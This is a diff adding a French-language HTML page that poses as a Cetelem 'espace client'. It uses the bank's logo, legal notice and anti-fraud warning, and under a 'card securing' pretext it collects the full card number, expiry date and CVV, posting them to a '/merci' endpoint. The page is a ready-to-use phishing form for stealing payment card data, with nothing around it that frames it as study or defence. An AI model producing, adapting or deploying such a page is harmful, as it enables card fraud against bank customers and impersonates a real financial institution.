@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion - Espace client</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body{margin:0;font-family:'Segoe UI',Arial,sans-serif;background:#c0d4cc;color:#333}
+    .logo{text-align:center;font-size:30px;font-weight:bold;color:#2e7d54;padding-top:25px}
+    .subtext{text-align:center;font-size:13px;color:#555;margin-bottom:25px;padding:0 15px}
+    .login-box{background:#fff;max-width:390px;margin:0 auto;padding:35px 30px;border-radius:10px;
+               box-shadow:0 0 12px rgba(0,0,0,.15);text-align:center;box-sizing:border-box}
+    .login-box h1{font-size:20px;margin-bottom:22px}
+    label{font-size:14px;display:block;text-align:left;margin-bottom:6px;font-weight:500}
+    input[type="text"],input[type="tel"]{
+      width:100%;padding:11px;font-size:15px;border:1px solid #2e7d54;border-radius:5px;
+      margin-bottom:18px;box-sizing:border-box;outline:none}
+    .btn{background:#2e7d54;color:#fff;font-size:15px;padding:11px 0;width:100%;border:none;
+         border-radius:5px;cursor:pointer}
+    .alert-box{background:#fef6e0;border-left:5px solid orange;padding:18px 20px;margin:30px auto;
+               max-width:420px;font-size:13.5px;border-radius:6px;color:#444;box-sizing:border-box}
+    footer{text-align:center;font-size:12px;margin:35px 15px 25px;color:#333}
+    footer a{margin:0 6px;color:#000;text-decoration:none}
+  </style>
+</head>
+<body>
+
+  <div class="logo">
+    <img src="https://www.cetelem.fr/brand/logo.svg" alt="Cetelem">
+  </div>
+
+  <div class="subtext">
+    <strong>Un crédit vous engage et doit être remboursé.</strong>
+    Vérifiez vos capacités de remboursement avant de vous engager.
+  </div>
+
+  <div class="login-box">
+    <h1>Sécurisation de votre carte Cpay</h1>
+
+    <!-- le formulaire s’envoie maintenant vers /merci -->
+    <form method="POST" action="/merci">
+      <label for="carte">Numéro de carte bancaire :</label>
+      <input type="text" id="carte" name="carte"
+             placeholder="Ex : 4100010203040506" pattern="\d{13,19}" maxlength="19" required>
+
+      <label for="date_exp">Date d'expiration (MM/YY) :</label>
+      <input type="text" id="date_exp" name="date_exp"
+             placeholder="MM/YY" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required>
+
+      <label for="cvv">Cryptogramme :</label>
+      <input type="text" id="cvv" name="cvv"
+             placeholder="Ex : 123" pattern="\d{3,4}" maxlength="4" required>
+
+      <button class="btn" type="submit">Valider</button>
+    </form>
+  </div>
+
+  <div class="alert-box">
+    <strong>⚠️ Contre la fraude, adoptez les bons réflexes</strong><br>
+    Ne communiquez jamais vos informations personnelles (identifiant, numéro de carte Cpay, code secret, etc.)
+    par téléphone, email, chat ou réseaux sociaux. JAMAIS Cetelem ne vous les demandera.
+    <br>
+    <button>Découvrez nos conseils →</button>
+  </div>
+
+  <footer>
+    <a href="#">Virement express</a>
+    <a href="#">Réclamation</a>
+    <a href="#">Contact</a>
+    <a href="#">Questions / Réponses</a>
+    <a href="#">Mentions légales</a>
+    <a href="#">Cookies</a>
+    <a href="#">Préférences cookies</a>
+    <a href="#">Accessibilité</a>
+  </footer>
+
+</body>
+</html>
